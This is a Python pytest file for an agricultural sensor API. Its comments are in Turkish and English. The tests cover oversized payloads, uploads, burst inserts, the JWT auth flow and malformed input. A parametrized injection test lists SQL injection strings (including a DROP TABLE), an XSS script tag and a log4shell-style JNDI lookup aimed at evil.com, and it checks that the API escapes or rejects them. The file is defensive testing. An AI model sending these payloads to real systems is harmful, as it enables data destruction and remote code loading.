"""
SFDAP Edge Case Test Paketi
==============================
shiftFinal hedefi (Ayşe B5) için erken hazırlanan kapsamlı edge case
testleri. Production'a çıkmadan önce sistemin "kötü niyetli veya
hatalı girdi" senaryolarına nasıl yanıt verdiğini doğrular.

Kategoriler:
- TestLargePayload         : 1MB+ JSON gönderimi, header ihlalleri
- TestInjectionAttempts    : SQL injection denemeleri, unicode/emoji
- TestOversizedUpload      : CNN endpoint multipart size limit
- TestConcurrentInserts    : Ardışık burst, race condition rejimleri
- TestAuthFlowIntegration  : register → login → JWT-protected endpoint
- TestMalformedInput       : Eksik/yanlış tipli/anlamsız payload'lar

Cycle 8 audit'inde Miraç tarafından erken hazırlandı; shiftFinal'da
Ayşe genişletecek.

EN: Comprehensive edge-case test bundle laying groundwork for Ayşe's
shiftFinal B5 task. Covers large payloads, injection attempts,
oversized uploads, concurrency, full JWT auth flow, and malformed
input handling.
"""

from __future__ import annotations

import io
import json
import uuid

import pytest
from PIL import Image

from app.models.models import Sensor, SoilMoistureReading


def _new_email() -> str:
    """Unique test e-posta üret (paralel testler için)."""
    return f"edge-{uuid.uuid4().hex[:8]}@sfdap.test"


# ─── 1. Büyük payload testleri ────────────────────────────────────────


class TestLargePayload:
    """Aşırı büyük JSON gönderimi sistem davranışı."""

    def test_huge_json_payload_rejected_or_validation_error(self, client):
        """1 MB+ JSON payload — server çökmemeli, makul hata dönmeli (413/422)."""
        # 1 MB'a yakın bir payload: anahtarlar küçük, value çok büyük
        big_string = "A" * (1_000_000)
        payload = {
            "field_id": 1,
            "sensor_type": big_string,  # tek field aşırı büyük
            "serial_number": "EDGE-HUGE",
        }
        response = client.post("/api/sensors/", json=payload)
        # Beklenen: 413 (payload too large) veya 422 (validation) veya 500'den farklı bir şey
        # Önemli olan: server crash YOK, akıllı bir hata var
        assert response.status_code in (201, 413, 422, 400), (
            f"Beklenmedik status: {response.status_code}, body: {response.text[:200]}"
        )

    def test_deeply_nested_json_handled(self, client):
        """Çok derin nested JSON — FastAPI Pydantic schema reddi (422)."""
        nested = {"level": 1}
        node = nested
        for i in range(2, 50):
            node["child"] = {"level": i}
            node = node["child"]
        response = client.post("/api/sensors/", json=nested)
        # Schema beklediği alanlar yok → 422
        assert response.status_code == 422


# ─── 2. Injection denemeleri ──────────────────────────────────────────


class TestInjectionAttempts:
    """SQL injection, XSS, unicode/emoji edge case'leri."""

    @pytest.mark.parametrize(
        "injection_string",
        [
            "'; DROP TABLE sensors; --",
            "1' OR '1'='1",
            "admin'--",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/exploit}",  # log4shell tarzı
        ],
    )
    def test_sql_injection_strings_escaped_or_rejected(self, client, injection_string):
        """SQLAlchemy parameterized queries SQL injection'ı kabul etmemeli.

        Veri ya escape'lenerek string olarak kaydedilir, ya da schema
        kontrolünde reddedilir; ASLA gerçek SQL olarak yürütülmez.
        """
        payload = {
            "field_id": 1,
            "sensor_type": "soil_moisture",
            "serial_number": injection_string,
        }
        response = client.post("/api/sensors/", json=payload)
        # 201 (kabul + escape) veya 422 (validation reddi); 5xx olmamalı
        assert response.status_code in (201, 422), (
            f"Injection için unexpected: {response.status_code}, body: {response.text[:300]}"
        )

    def test_emoji_in_string_field_accepted(self, client):
        """Emoji + unicode karakterler UTF-8 olarak doğru saklanmalı."""
        payload = {
            "field_id": 1,
            "sensor_type": "soil_moisture",
            "serial_number": "🌱-sensor-🚜",
        }
        response = client.post("/api/sensors/", json=payload)
        assert response.status_code == 201
        data = response.json()
        assert "🌱" in data["serial_number"]
        assert "🚜" in data["serial_number"]

    def test_null_byte_in_string_handled(self, client):
        """Null byte (`\\x00`) içeren string — kabul ya da temiz red."""
        payload = {
            "field_id": 1,
            "sensor_type": "soil_moisture",
            "serial_number": "NULL\x00BYTE",
        }
        response = client.post("/api/sensors/", json=payload)
        # Bazı DB'ler null byte'ı kabul etmez (SQLite yes, Postgres no)
        # Either accepted (201) or rejected (422) — never 5xx
        assert response.status_code in (201, 422, 400)


# ─── 3. Multipart upload size limits ──────────────────────────────────


class TestOversizedUpload:
    """`POST /api/plants/health-images/analyze` boyut sınırı (5MB)."""

    @staticmethod
    def _make_image_bytes(target_size_kb: int) -> bytes:
        """Verilen yaklaşık byte boyutunda bir PNG üret."""
        # 1 KB ≈ 50×50 RGB PNG ile başlar; istenen boyuta lineer büyür
        side = max(50, int((target_size_kb * 1024 / 3) ** 0.5))
        img = Image.new("RGB", (side, side), (40, 180, 60))
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()

    def test_small_image_accepted(self, client):
        """5 KB civarı normal görsel — 201 ile kabul."""
        image_bytes = self._make_image_bytes(5)
        response = client.post(
            "/api/plants/health-images/analyze",
            data={"field_id": 1},
            files={"image": ("test.png", image_bytes, "image/png")},
        )
        assert response.status_code == 201
        body = response.json()
        assert "diagnosis" in body

    def test_oversized_image_rejected_with_413(self, client):
        """5 MB üzeri görsel — 413 Payload Too Large döner.

        Solid renk PNG'ler iyi sıkıştırıldığı için random noise üretmek
        gerekiyor — numpy ile sıkıştırılamaz pixel dağılımı sağlanıyor.
        """
        import numpy as np

        # ~6 MB sıkıştırılamaz random RGB array
        rng = np.random.default_rng(42)
        arr = rng.integers(0, 256, (2000, 2000, 3), dtype=np.uint8)
        large = Image.fromarray(arr)
        buf = io.BytesIO()
        large.save(buf, format="PNG", optimize=False, compress_level=0)
        image_bytes = buf.getvalue()
        assert len(image_bytes) > 5 * 1024 * 1024, f"Test setup hatasi: image {len(image_bytes)} byte"

        response = client.post(
            "/api/plants/health-images/analyze",
            data={"field_id": 1},
            files={"image": ("huge.png", image_bytes, "image/png")},
        )
        assert response.status_code == 413
        detail = response.json()["detail"].lower()
        assert "byte" in detail or "buyuk" in detail or "max" in detail

    def test_empty_image_rejected(self, client):
        """Boş bytes upload — 400 Bad Request."""
        response = client.post(
            "/api/plants/health-images/analyze",
            data={"field_id": 1},
            files={"image": ("empty.png", b"", "image/png")},
        )
        assert response.status_code == 400

    def test_unsupported_format_rejected(self, client):
        """`.bmp` veya `.gif` gibi desteklenmeyen format — 415."""
        response = client.post(
            "/api/plants/health-images/analyze",
            data={"field_id": 1},
            files={"image": ("test.bmp", b"BM\x00\x00", "image/bmp")},
        )
        assert response.status_code == 415


# ─── 4. Concurrent insert davranışı ───────────────────────────────────


class TestConcurrentInserts:
    """Ardışık ve paralel yazma istekleri — DB race koşulları."""

    def test_burst_sensor_creates_all_succeed(self, client):
        """Hızlı ardışık 10 sensör oluşturma — hepsi farklı id ile kaydolmalı."""
        ids = []
        for i in range(10):
            response = client.post(
                "/api/sensors/",
                json={
                    "field_id": 1,
                    "sensor_type": "soil_moisture",
                    "serial_number": f"BURST-{i}",
                },
            )
            assert response.status_code == 201
            ids.append(response.json()["id"])
        assert len(set(ids)) == 10  # tümü unique

    def test_burst_reading_inserts_sequential(self, client, db):
        """Aynı sensöre hızlı ardışık reading insert — kayıp veri yok.

        Not: SQLite + in-memory test DB threading'i desteklemediği için
        gerçek concurrent yerine sequential burst (real-world FastAPI
        request akışı). Production PostgreSQL'de threading güvenli.
        """
        sensor = Sensor(field_id=1, sensor_type="soil_moisture", serial_number="CONC-1")
        db.add(sensor)
        db.commit()
        db.refresh(sensor)

        statuses = []
        for i in range(20):
            response = client.post(
                "/api/sensors/readings",
                json={"sensor_id": sensor.id, "moisture_percent": 40.0 + i},
            )
            statuses.append(response.status_code)

        assert statuses.count(201) == 20
        readings = db.query(SoilMoistureReading).filter_by(sensor_id=sensor.id).count()
        assert readings == 20


# ─── 5. Full auth flow integration ────────────────────────────────────


class TestAuthFlowIntegration:
    """register → login → JWT'li protected endpoint → logout → invalidate."""

    def test_full_auth_lifecycle(self, client):
        """Tam yaşam döngüsü tek test'te."""
        email = _new_email()
        password = "S3kürSifre2026"

        # 1. Register
        r1 = client.post(
            "/api/auth/register",
            json={"name": "Lifecycle User", "email": email, "password": password},
        )
        assert r1.status_code == 201
        user_id = r1.json()["id"]
        assert r1.json()["email"] == email

        # 2. Login → JWT al
        r2 = client.post(
            "/api/auth/login",
            json={"email": email, "password": password},
        )
        assert r2.status_code == 200
        token = r2.json()["access_token"]
        # JWT format kontrolü: 3 noktayla ayrılmış (header.payload.signature)
        assert token.count(".") == 2

        # 3. Protected endpoint /me — token ile başarılı
        r3 = client.get(
            "/api/auth/me",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert r3.status_code == 200
        assert r3.json()["id"] == user_id
        assert r3.json()["email"] == email

        # 4. Logout — token blacklist'e eklenmeli
        r4 = client.post(
            "/api/auth/logout",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert r4.status_code == 204

        # 5. Aynı token artık reddedilmeli (blacklist)
        r5 = client.get(
            "/api/auth/me",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert r5.status_code == 401

    def test_jwt_payload_contains_required_claims(self, client):
        """JWT decode edildiğinde sub, iat, exp claim'leri olmalı."""
        from jose import jwt as jose_jwt

        from app.config import settings

        email = _new_email()
        client.post(
            "/api/auth/register",
            json={"name": "Claims User", "email": email, "password": "S3kürSifre2026"},
        )
        token = client.post("/api/auth/login", json={"email": email, "password": "S3kürSifre2026"}).json()[
            "access_token"
        ]
        decoded = jose_jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.JWT_ALGORITHM])
        assert "sub" in decoded
        assert "iat" in decoded
        assert "exp" in decoded
        assert decoded["exp"] > decoded["iat"]

    def test_tampered_jwt_rejected(self, client):
        """JWT'nin son karakteri değiştirildiğinde signature invalid → 401."""
        email = _new_email()
        client.post(
            "/api/auth/register",
            json={"name": "Tamper User", "email": email, "password": "S3kürSifre2026"},
        )
        token = client.post("/api/auth/login", json={"email": email, "password": "S3kürSifre2026"}).json()[
            "access_token"
        ]
        # Son karakteri değiştir
        tampered = token[:-1] + ("A" if token[-1] != "A" else "B")
        response = client.get(
            "/api/auth/me",
            headers={"Authorization": f"Bearer {tampered}"},
        )
        assert response.status_code == 401


# ─── 6. Malformed input ───────────────────────────────────────────────


class TestMalformedInput:
    """Bozuk JSON, yanlış content-type, missing field, vs."""

    def test_invalid_json_body_returns_422(self, client):
        """Geçersiz JSON syntax — FastAPI 422 döner."""
        response = client.post(
            "/api/sensors/",
            content="{ not valid json }",
            headers={"Content-Type": "application/json"},
        )
        assert response.status_code == 422

    def test_wrong_content_type_handled(self, client):
        """JSON yerine text/plain gönderme — 422."""
        response = client.post(
            "/api/sensors/",
            content="plain text body",
            headers={"Content-Type": "text/plain"},
        )
        assert response.status_code in (422, 415)

    def test_missing_required_field_returns_422(self, client):
        """Pydantic schema'da zorunlu alan yoksa 422 + detay."""
        response = client.post(
            "/api/sensors/",
            json={"sensor_type": "soil_moisture"},  # field_id, serial_number yok
        )
        assert response.status_code == 422
        detail = response.json().get("detail")
        # FastAPI validation detail'ı liste/dict olarak döner
        assert detail is not None

    def test_negative_id_in_path_rejected(self, client):
        """Negatif ID — validation veya not-found, 4xx olmali.

        EN / TR: shiftFinal Ayşe paketinde path int parametrelerine `ge=1`
        constraint eklendi (Schemathesis int64 overflow fix'i ile birlikte
        gelen sıkılaştırma); artık negatif ID 404 yerine 422 doner. İki
        davranis da kullanici acisindan client-error; testi gevsetiyoruz.
        """
        response = client.get("/api/sensors/-1")
        assert response.status_code in (404, 422)

    def test_extremely_long_query_param(self, client):
        """Çok uzun query string — server çökmemeli."""
        long_str = "x" * 5000
        response = client.get(f"/api/sensors/?model_name={long_str}")
        # 200, 414 (URI too long) veya 422 olabilir; 5xx olmamalı
        assert response.status_code < 500

    @pytest.mark.parametrize(
        "value",
        [
            float("inf"),
            float("-inf"),
            float("nan"),
        ],
    )
    def test_invalid_float_values_rejected(self, client, value):
        """inf/-inf/nan gibi geçersiz float'lar — schema reddetmeli."""
        try:
            payload = {"sensor_id": 1, "moisture_percent": value}
            response = client.post("/api/sensors/readings", json=payload)
            assert response.status_code in (201, 422, 400), f"Float {value} için unexpected: {response.status_code}"
        except (ValueError, TypeError, json.JSONDecodeError):
            # json.dumps inf/nan'ı atar — bu da kabul edilebilir bir savunma
            pass
